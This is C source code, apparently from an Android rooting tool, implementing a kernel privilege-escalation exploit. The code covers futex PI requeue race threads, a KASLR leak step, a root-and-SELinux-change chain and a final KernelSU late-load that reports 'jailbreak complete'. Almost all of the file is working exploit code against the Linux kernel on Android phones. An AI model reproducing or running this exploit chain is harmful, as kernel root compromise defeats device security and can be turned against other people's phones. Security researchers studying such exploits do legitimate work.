#include "common.h"
#include "ksu_proto.h"
#include "azhl_backend.h"
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/system_properties.h>
#include <sys/un.h>

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;
static atomic_int waiter_ready;
static atomic_int waiter_waiting;
static atomic_int owner_started;
static atomic_int owner_chain_done;
static atomic_int route_done;
static atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
static atomic_int consumer_completed;

#define WALK_US_SLOW 1000000L
atomic_long consumer_max_walk_us;
atomic_int main_route_delay_usec;
int memfd_leak;

int log_fd;

/* Futex PI waiter thread (performs the walk). */
void* waiter_thread(void* arg __attribute__((unused))) {
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

  pselect_last_ret = do_pselect_fake_lock_route();

  if (pselect_clobber) {
    clobber_fd_words_for_clean_exit();
  }
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

/* Futex PI owner thread. */
void* owner_thread(void* arg __attribute__((unused))) {
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    pause();
  }
}

static long consumer_sched_pulse(int tid, int seq) {
  struct timespec t0;
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  errno = 0;
  long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
  clock_gettime(CLOCK_MONOTONIC, &t1);
  int saved_errno = errno;
  long walk_us = (t1.tv_sec - t0.tv_sec) * 1000000L + (t1.tv_nsec - t0.tv_nsec) / 1000L;
  long cur_max = atomic_load(&consumer_max_walk_us);
  while (walk_us > cur_max &&
         !atomic_compare_exchange_weak(&consumer_max_walk_us, &cur_max, walk_us)) {
  }
  pr_info("walk pulse: seq=%d ret=%ld errno=%d tid=%d walk_us=%ld%s\n", seq, sched_ret, saved_errno,
          tid, walk_us, walk_us > WALK_US_SLOW ? " SLOW-WALK" : "");
  atomic_fetch_add(&consumer_completed, 1);
  return sched_ret;
}

/* Consumer thread: sched_setattr pulses to advance the walk. */
void* consumer_thread(void* arg __attribute__((unused))) {
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    for (;;) {
      if (atomic_load(&punch_consume_stop) || atomic_load(&punch_consume_go) != seq) {
        break;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        pr_debug("pulse usleep=%d\n", delay_usec);
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) || atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        if (consumer_sched_pulse(tid, seq) == 0) {
          atomic_fetch_add(&consumer_success, 1);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&consumer_completed, 0);
  atomic_store(&consumer_max_walk_us, 0);

  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
}

/* Orchestrate the three route threads and fire the walk. */
void run_main_route_threads(void) {
  pr_debug("%s\n", __func__);
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);

  while (!atomic_load(&route_done)) {
    usleep(10000);
  }

  int completion_wait_ms = 5000;
  int completion_waited_ms = 0;
  while (atomic_load(&consumer_completed) < atomic_load(&consumer_calls) &&
         completion_waited_ms < completion_wait_ms) {
    usleep(1000);
    completion_waited_ms++;
  }
  if (atomic_load(&consumer_completed) < atomic_load(&consumer_calls)) {
    pr_warning(
        "route threads: completion timeout calls=%d completed=%d "
        "waited_ms=%d\n",
        atomic_load(&consumer_calls), atomic_load(&consumer_completed), completion_waited_ms);
  } else if (completion_waited_ms) {
    pr_info(
        "route threads: completion joined calls=%d completed=%d "
        "waited_ms=%d\n",
        atomic_load(&consumer_calls), atomic_load(&consumer_completed), completion_waited_ms);
  }

  atomic_store(&punch_consume_stop, 1);
  if (atomic_load(&consumer_completed) >= atomic_load(&consumer_calls)) {
    int join_ret = pthread_join(consumer, NULL);
    if (join_ret != 0) {
      pr_warning("route threads: join failed error=%d\n", join_ret);
    }
  }
}

static int prepare_ksud_stage(void) {
  const char* src = KSU_LOADER_PATH;
  const char* dst = KSU_STAGE_PATH;

  struct stat ss, ds;
  if (stat(dst, &ds) == 0 && stat(src, &ss) == 0 && ds.st_size == ss.st_size) {
    pr_info("KernelSU loader stage already present (%lld bytes)\n", (long long)ds.st_size);
    return 0;
  }

  int in = open(src, O_RDONLY | O_CLOEXEC);
  if (in < 0) {
    int saved = errno;
    pr_warning("loader stage: open %s errno=%d\n", src, saved);
    return -1;
  }
  int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (out < 0) {
    int saved = errno;
    pr_warning("loader stage: open %s errno=%d\n", dst, saved);
    close(in);
    return -1;
  }

  fchmod(out, 0755);
  char buf[8192];
  int ok = 1;
  for (;;) {
    ssize_t n = read(in, buf, sizeof(buf));
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      if (n < 0) {
        ok = 0;
      }
      break;
    }
    ssize_t off = 0;
    while (off < n) {
      ssize_t w = write(out, buf + off, (size_t)(n - off));
      if (w < 0 && errno == EINTR) {
        continue;
      }
      if (w <= 0) {
        ok = 0;
        break;
      }
      off += w;
    }
    if (!ok) {
      break;
    }
  }
  close(in);
  close(out);
  if (!ok) {
    unlink(dst);
    pr_warning("loader stage: copy %s -> %s failed\n", src, dst);
    return -1;
  }
  if (stat(dst, &ds) != 0 || stat(src, &ss) != 0 || ds.st_size != ss.st_size) {
    unlink(dst);
    pr_warning("loader stage: size mismatch after copy\n");
    return -1;
  }
  pr_success("KernelSU loader staged (%lld bytes)\n", (long long)ds.st_size);
  return 0;
}

static int umh_request_ksu(void) {
  const char *helper=getenv("CVE43499_ROOT_HELPER");
  pid_t child=fork();
  if(child<0)return -1;
  if(child==0){
    execl(helper,helper,"--late-load",getenv("AZHL_BACKEND"),getenv("AZHL_DRIVER_VERSION"),getenv("AZHL_DISABLE_MODULES"),(char*)NULL);
    _exit(126);
  }
  int status=0;
  while(waitpid(child,&status,0)<0)if(errno!=EINTR)return -1;
  return WIFEXITED(status)?WEXITSTATUS(status):128;
}
static int azhl_validate_request(void) {
  const char *helper=getenv("CVE43499_ROOT_HELPER");
  struct stat st;
  return azhl_backend_find(getenv("AZHL_BACKEND"),getenv("AZHL_DRIVER_VERSION")) &&
    azhl_disable_valid(getenv("AZHL_DISABLE_MODULES")) && helper && helper[0]=='/' &&
    lstat(helper,&st)==0 && S_ISREG(st.st_mode) && st.st_uid==2000 && access(helper,X_OK)==0 &&
    lstat(KSU_LOADER_PATH,&st)==0 && S_ISREG(st.st_mode) && st.st_uid==2000 && st.st_size>0 &&
    lstat(KSU_STAGE_PATH,&st)==0 && S_ISREG(st.st_mode) && st.st_uid==2000 && st.st_size>0;
}

/* Top-level flow: params, slide, claim, carrier, root, KSU. */
int run_exploit(int argc, char** argv) {
  (void)argc;
  (void)argv;

  log_fd = PSELECT_ROUTE_NFDS + 55;
  dup2(STDOUT_FILENO, log_fd);

  if (params_resolve() != 0) {
    pr_error("params resolve failed; refusing to run on unsupported build\n");
    return 2;
  }

  if (!azhl_validate_request()) { pr_warning("Invalid or unstaged AZHL backend request\n"); return 5; }
  if (ghostlock_boot_claim()) return 4;

  set_unbuffer();
  set_limit();
  log_startup_context();
  pr_success("build matched: device=%s build_id=%s line=%s\n",
             g_ident.device ? g_ident.device : "?", g_ident.build_id ? g_ident.build_id : "?",
             g_ident.line_id ? g_ident.line_id : "?");

  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }

  if (!attr_run()) {
    return 3;
  }
  int ok = install_android_root();
  pr_success("root chain: uid=%u->%u selinux=%s->%s daemon=%s\n", root_uid_before,
             root_uid_after, selinux_before ? "enforcing" : "permissive",
             selinux_after ? "enforcing" : "permissive",
             root_child_done ? "ready" : "not-ready");
  if (!ok) {
    return 3;
  }

  /* Both identical files were staged and hashed by the app before the boot claim.
   * Keep the original retry loop: the daemon can be momentarily unready
   * right after the UMH root lands (socket not yet listening). */
  int ksu = -1;
  for (int r = 0; r < 3 && ksu != 0; r++) {
    if (r > 0) {
      pr_warning("ksud late-load retry %d/3 (last status=%d)\n", r, ksu);
      usleep(300000);
    }
    ksu = umh_request_ksu();
  }
  if (ksu == 0) {
    pr_success("ksud late-load OK\n");
    pr_success("Temporary root granted, jailbreak complete!\n");
    pr_success("built by nothin 2026.08.18\n");
    return 0;
  }
  pr_warning("ksud late-load failed status=%d\n", ksu);
  return 1;
}
